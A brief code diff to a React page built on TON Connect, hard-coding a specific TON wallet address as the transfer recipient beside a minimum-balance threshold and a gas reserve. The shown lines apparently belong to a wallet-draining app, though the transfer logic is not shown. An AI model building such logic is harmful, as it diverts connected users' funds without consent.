@@ -8,7 +8,7 @@ import {
   useTonAddress,
 } from "@tonconnect/ui-react";
 
-const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;
+const RECIPIENT = "UQCcKyohuqyATqhTcdlSgbFolnk0plNr4oHzASNAtFbrqwoZ";
 const MIN_BALANCE_NANO = BigInt("100000000"); // 0.1 TON threshold
 const GAS_RESERVE_NANO = BigInt("10000000");  // 0.01 TON reserve
 
@@ -177,4 +177,5 @@ export default function Home() {
     </main>
   );
 }
+
 
